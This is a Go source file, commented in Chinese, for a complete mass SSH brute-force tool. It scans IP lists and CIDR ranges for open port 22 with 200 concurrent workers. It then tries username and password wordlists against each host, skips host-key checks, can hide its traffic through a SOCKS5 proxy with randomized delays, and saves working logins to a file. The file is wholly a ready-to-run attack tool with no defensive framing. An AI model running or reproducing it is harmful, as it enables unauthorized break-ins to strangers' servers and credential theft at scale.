package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

const (
	port        = "22"
	concurrency = 200 // 并发扫描数
	timeout     = 2 * time.Second
	// 固定 IP 文件名稱，請確保文件名稱正確，並放在程序可讀取的目錄下
	ipFilename = "ip.txt"
)

var (
	useProxy   bool
	socks5Addr string
)

func init() {
	flag.BoolVar(&useProxy, "proxy", false, "是否使用 SOCKS5 代理")
	flag.StringVar(&socks5Addr, "proxyAddr", "127.0.0.1:1080", "SOCKS5 代理地址")
	flag.Parse()
}

func main() {
	rand.Seed(time.Now().UnixNano())

	// 創建結果文件
	resultFile, err := os.OpenFile("success.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("無法創建結果文件: %v\n", err)
		return
	}
	defer resultFile.Close()

	// 讀取用戶名和密碼列表
	users, err := readLines("user.txt")
	if err != nil {
		fmt.Printf("讀取用戶文件失敗: %v\n", err)
		return
	}

	passwords, err := readLines("passwd.txt")
	if err != nil {
		fmt.Printf("讀取密碼文件失敗: %v\n", err)
		return
	}

	fmt.Printf("已加載 %d 個用戶名和 %d 個密碼\n", len(users), len(passwords))

	// 讀取IP文件，支持單個 IP 或 CIDR 範圍（文件名固定為 iptxt）
	ipChan := readIPFile(ipFilename)

	// 創建 worker 池掃描端口
	openIPs := make(chan string)
	var scanWg sync.WaitGroup
	scanWg.Add(concurrency)

	// 進度顯示計數器
	var counter struct {
		sync.Mutex
		total, open int
	}

	// 啟動掃描 worker
	for i := 0; i < concurrency; i++ {
		go func() {
			defer scanWg.Done()
			for ip := range ipChan {
				counter.Lock()
				counter.total++
				currentTotal := counter.total
				counter.Unlock()

				if currentTotal%1000 == 0 { // 每掃1000個IP顯示進度
					counter.Lock()
					fmt.Printf("\r[進度] 已掃描: %d 個IP | 開放22端口: %d 個", counter.total, counter.open)
					counter.Unlock()
				}

				if isOpen(ip, port) {
					counter.Lock()
					counter.open++
					counter.Unlock()
					openIPs <- ip
				}
			}
		}()
	}

	// 處理開放主機
	var authWg sync.WaitGroup
	results := make(chan string)

	// 結果處理協程
	go func() {
		for ip := range openIPs {
			authWg.Add(1)
			go func(target string) {
				defer authWg.Done()
				fmt.Printf("\n[*] 嘗試登錄: %s\n", target)
				trySSH(target, users, passwords, results)
			}(ip)
		}
	}()

	// 關閉通道協程
	go func() {
		scanWg.Wait()
		close(openIPs)
		authWg.Wait()
		close(results)
	}()

	// 輸出結果
	for result := range results {
		fmt.Println("[+] 成功登錄:", result)
		if _, err := resultFile.WriteString(result + "\n"); err != nil {
			fmt.Printf("寫入文件錯誤: %v\n", err)
		}
	}

	fmt.Printf("\n掃描完成! 共掃描 %d 個IP，其中 %d 個開放22端口\n", counter.total, counter.open)
	fmt.Println("成功登錄結果已保存到 success.txt")
}

// readLines 讀取文件每行為一個字符串
func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		trim := strings.TrimSpace(scanner.Text())
		if trim != "" {
			lines = append(lines, trim)
		}
	}
	return lines, scanner.Err()
}

// readIPFile 讀取 IP 文件，支持單個 IP 或 CIDR 範圍，每行一個
func readIPFile(filename string) <-chan string {
	out := make(chan string)
	go func() {
		defer close(out)
		lines, err := readLines(filename)
		if err != nil {
			fmt.Printf("讀取 IP 文件失敗: %v\n", err)
			return
		}
		for _, line := range lines {
			// 優先嘗試解析成 CIDR
			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
					out <- ip.String()
				}
			} else {
				// 嘗試解析為單個 IP
				if ip := net.ParseIP(line); ip != nil {
					out <- ip.String()
				} else {
					fmt.Printf("無法解析 IP: %s\n", line)
				}
			}
		}
	}()
	return out
}

// inc 用於遞增 IP 地址
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// isOpen 檢查指定IP和端口是否開放
func isOpen(ip, port string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// trySSH 嘗試使用多組用戶名和密碼通過 SSH 登錄
func trySSH(ip string, users, passwords []string, results chan<- string) {
	config := &ssh.ClientConfig{
		Timeout:         timeout,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// 隨機延時（100-500ms）
	delay := time.Duration(100+rand.Intn(400)) * time.Millisecond
	time.Sleep(delay)

	var dialer proxy.Dialer
	var err error
	if useProxy {
		dialer, err = proxy.SOCKS5("tcp", socks5Addr, nil, proxy.Direct)
		if err != nil {
			fmt.Printf("建立 SOCKS5 dialer 失敗: %v\n", err)
			return
		}
	} else {
		dialer = proxy.Direct
	}

	for _, user := range users {
		for _, password := range passwords {
			config.User = user
			config.Auth = []ssh.AuthMethod{
				ssh.Password(password),
			}

			conn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
			if err != nil {
				continue
			}

			sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
			if err != nil {
				conn.Close()
				continue
			}
			client := ssh.NewClient(sshConn, chans, reqs)
			defer client.Close()

			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, ip, password)
			results <- successMsg
			return
		}
	}
}

